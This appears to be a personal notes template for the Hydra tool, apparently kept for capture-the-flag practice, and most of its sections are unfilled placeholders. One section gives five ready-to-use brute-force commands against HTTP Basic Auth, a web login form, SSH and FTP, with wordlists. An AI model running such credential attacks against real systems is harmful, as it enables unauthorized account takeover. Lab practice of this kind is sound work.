# hydra

_What this tool does and when I reach for it_

## Primary Use Cases

Main things I use this tool for

## Command Patterns

### Category 1

Basic Auth Brute Force - Combined Wordlist
```bash
hydra -C wordlist.txt SERVER_IP -s PORT http-get /
```

Basic Auth Brute Force - User/Pass Wordlists
```bash
hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /
```

Login Form Brute Force - Static User, Pass Wordlist
```bash
hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```

SSH Brute Force - User/Pass Wordlists
```bash
hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4
```

FTP Brute Force - Static User, Pass Wordlist
```bash
hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1
```
^hydra-category3

## Syntax I Forget

- Flag or option I always look up
- Parameter format I can't remember
- Output options or file formats

## When I Use This vs Alternatives

- **Use this tool when:** Specific circumstances
- **Use alternative when:** When other tools are better
- **Combines well with:** Tools that work together with this

## Personal Notes

- Things I learned from experience
- Common mistakes I made
- Environment-specific quirks

## CTF Examples

```dataview
TABLE file.name as "Box", choice(contains(file.tags, "easy"), "🟢", choice(contains(file.tags, "medium"), "🟡", "🔴")) as "Diff"
FROM "06-CTF-Writeups" AND #hydra
SORT file.ctime DESC
LIMIT 5
```

## Quick Links

- [[Primary-Technique]] - Main technique this supports
- [[Secondary-Technique]] - Other technique this supports

#hydra #tool